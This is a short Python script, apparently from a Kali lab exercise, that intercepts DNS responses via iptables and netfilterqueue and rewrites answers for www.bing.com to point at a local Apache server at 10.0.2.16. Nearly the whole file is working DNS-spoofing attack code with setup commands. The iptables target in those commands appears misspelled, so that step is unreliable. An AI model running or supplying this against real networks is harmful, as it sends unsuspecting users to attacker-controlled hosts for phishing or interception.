#!/usr/bin/env python

#USE COMMAND IN TERMINAL CMD1 -: "iptables -I OUTPUT -j NETQUEUE --queue-num 0"
#USE COMMAND IN SAME TERMINAL CMD2 -: "iptables -I INPUT -j NETQUEUE --queue-num 0"
#AT END REMOVE THE iptables using COMMAND - : "iptables --flush"


#INSTALL MODULE "NETFILTERQUEUE" to access the above queue created using command.
#Step1 : apt install python3-pip git libnfnetlink-dev libnetfilter-queue-dev // in kali installation of netfilterqueue
#Step2 : pip3 install -U git+https://github.com/kti/python-netfilterqueue

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname = qname,rdata = "10.0.2.16") #APACHE SERVER IP KALI
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))




    packet.accept() #The packet is trapped using this
    #packet.accept() #packet is forward to the destination

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)# 0 is queue no used in above command
queue.run()


#ping -c bing.com


